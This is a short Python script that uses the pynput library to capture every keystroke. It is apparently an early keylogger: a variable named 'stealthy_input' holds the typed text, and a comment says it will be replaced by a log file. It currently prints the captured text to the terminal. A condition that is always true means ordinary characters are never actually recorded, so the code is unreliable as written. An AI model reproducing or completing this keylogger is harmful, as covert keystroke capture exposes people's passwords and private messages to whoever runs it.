from pynput import keyboard
import os

stealthy_input = ""  # Hehehehe ( ͡° ͜ʖ ͡°) [Will be replaced by log file]


def on_press(key):
    global stealthy_input

    if key == keyboard.Key.backspace and len(stealthy_input) == 0:
        pass
    elif key == keyboard.Key.backspace and len(stealthy_input) > 0:
        stealthy_input = stealthy_input[:-1]  # Remove the last character
    elif key == keyboard.Key.enter:
        stealthy_input += "\n"
    elif key == keyboard.Key.space:
        stealthy_input += " "
    elif key == keyboard.Key.tab:
        stealthy_input += "\t"
    elif key == keyboard.Key.shift:
        pass
    elif (
        key == keyboard.Key.ctrl
        or key == keyboard.Key.ctrl_l
        or key == keyboard.Key.ctrl_r
        or keyboard.Key.cmd
    ):
        pass
    elif key == keyboard.Key.alt:
        pass
    else:
        stealthy_input += str(key).strip("'")

    os.system("clear")  # Clear the terminal
    print(stealthy_input)


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
